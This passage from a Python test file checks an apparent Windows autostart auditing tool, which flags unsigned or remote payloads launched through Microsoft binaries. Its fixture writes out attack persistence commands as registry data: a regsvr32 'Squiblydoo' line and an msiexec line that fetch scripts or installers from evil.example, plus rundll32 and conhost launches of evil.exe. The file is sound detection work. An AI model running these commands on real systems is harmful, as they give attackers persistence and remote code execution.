        "rundll32.exe", "shell32.dll", "url.dll", "regsvr32.exe", "scrobj.dll", "msiexec.exe", "conhost.exe",
        "onlyx64.dll", "ws64.dll")]
    ms_files.append(_file(win / "Installer" / "ms.msi"))
    evil = _file(tmp / "Users" / "x" / "evil.exe", b"MZ evil")
    wow_dll = _file(wow / "onlyx64.dll", b"MZ 32-bit impostor")
    lsp32 = _file(wow / "lsp32.dll", b"MZ 32-bit lsp")
    whql = _file(s32 / "drivers" / "whqlos.sys")
    registry = {
        RUN_KEY: {
            "ShellExec": f"rundll32.exe shell32.dll,ShellExec_RunDLL {evil}",
            "UrlDll": f"rundll32.exe url.dll,FileProtocolHandler {evil}",
            "Squiblydoo": "regsvr32.exe /s /n /u /i:http://evil.example/x.sct scrobj.dll",
            "RemoteMsi": "msiexec.exe /q /i http://evil.example/x.msi",
            "Headless": f"conhost.exe --headless {evil}",
            "SctOnDrive": "regsvr32.exe /s /n /i:C:\\Users\\x\\y.sct scrobj.dll",
            # Windows uses the same hosts for its own entries - those stay hidden.
            "MsOptions": "rundll32.exe shell32.dll,Options_RunDLL 0",
            "MsMsi": f"msiexec.exe /i {win / 'Installer' / 'ms.msi'} /qn",
        },
        ACTIVE_SETUP + "\\{44444444-4444-4444-4444-444444444444}": {"StubPath": "regsvr32.exe /s /n /i:U shell32.dll"},
        APPINIT_KEY: {"AppInit_DLLs": "onlyx64.dll"},
        APPINIT_KEY.replace("SOFTWARE\\", "SOFTWARE\\WOW6432Node\\"): {"AppInit_DLLs": "onlyx64.dll"},
        WINSOCK + "\\Protocol_Catalog9\\Catalog_Entries\\000000000009": {
            "PackedCatalogItem": b"%SystemRoot%\\system32\\lsp32.dll\x00junk"},
        WINSOCK + "\\Protocol_Catalog9\\Catalog_Entries64\\000000000010": {
            "PackedCatalogItem": b"%SystemRoot%\\System32\\ws64.dll\x00junk"},
        SVC_ROOT + "\\whqlos": {"Start": 1, "Type": 1, "ImagePath": "\\SystemRoot\\System32\\drivers\\whqlos.sys"},
    }
    signatures = {path: MS_SIG for path in ms_files}
    signatures[whql] = ("Valid", "CN=Microsoft Windows Hardware Compatibility Publisher, O=Microsoft Corporation",
                        "CN=Microsoft Windows Third Party Component CA 2014, O=Microsoft Corporation", True)
    result, calls = _run_signed_view(tmp, registry, [], signatures, {})
    assert result.returncode == 0, result.stdout + result.stderr
    return {"tmp": tmp, "stdout": result.stdout, "calls": calls, "entries": _parse_entries(result.stdout),
            "evil": evil, "s32": s32, "wow": wow, "wow_dll": wow_dll, "lsp32": lsp32}


def test_signed_view_shows_microsoft_proxy_launchers_that_run_foreign_files(proxy_view):
    evil = str(proxy_view["evil"])
    for name in ("ShellExec", "UrlDll"):
        entry = _entry(proxy_view, "Run", name)
        # The DLL rundll32 loads is Microsoft's; the file in the arguments is not.
        assert entry["status"] == "Valid"
        assert entry["Note"] == f"proxy launcher rundll32.exe - its arguments name {evil} (NotSigned)."
    for name, host, url in (("Squiblydoo", "regsvr32.exe", "http://evil.example/x.sct"),
                            ("RemoteMsi", "msiexec.exe", "http://evil.example/x.msi")):
        entry = _entry(proxy_view, "Run", name)
        assert entry["Note"] == f"proxy launcher {host} - its arguments load {url} from the network."
    assert _entry(proxy_view, "Run", "SctOnDrive")["Note"] == (
        "proxy launcher regsvr32.exe - its arguments name C:\\Users\\x\\y.sct, outside the Windows folder.")
    # conhost --headless only launches its arguments: shown like a script host.
    assert _entry(proxy_view, "Run", "Headless")["Note"].startswith("script host")
    shown = {(e["category"], e["name"]) for e in proxy_view["entries"]}
    for hidden in (("Run", "MsOptions"), ("Run", "MsMsi"), ("ActiveSetup", "{44444444-4444-4444-4444-444444444444}")):
        assert hidden not in shown, hidden
    assert "\nRun: 6 / 8\n" in proxy_view["stdout"].replace("\r\n", "\n")
    # The file named in the arguments is checked like any other file - once.
    calls = [c.lower() for c in proxy_view["calls"]]
    assert calls.count(evil.lower()) == 1


def test_signed_view_resolves_32_bit_only_locations_in_syswow64(proxy_view):
    s32, wow = proxy_view["s32"], proxy_view["wow"]
    appinit = [e for e in proxy_view["entries"] if e["category"] == "AppInit"]
    # The 64-bit key loads the Microsoft-signed System32 copy (hidden); the
    # WOW6432Node key loads the unsigned SysWOW64 file of the same name.
    assert [(e["location"], e["File"], e["status"]) for e in appinit] == [
        (APPINIT_KEY.replace("SOFTWARE\\", "SOFTWARE\\WOW6432Node\\"), str(proxy_view["wow_dll"]), "NotSigned")]
    lsp = _entry(proxy_view, "Winsock", "000000000009")
    assert lsp["File"] == str(proxy_view["lsp32"])
    assert lsp["status"] == "NotSigned"
    assert ("Winsock", "000000000010") not in {(e["category"], e["name"]) for e in proxy_view["entries"]}
    assert str(s32 / "ws64.dll").lower() in [c.lower() for c in proxy_view["calls"]]


def test_signed_view_keeps_whql_drivers_even_when_reported_as_os_binary(proxy_view):
    driver = _entry(proxy_view, "Driver", "whqlos")
    assert driver["status"] == "Valid"
    assert driver["Signer"].startswith("CN=Microsoft Windows Hardware Compatibility Publisher")
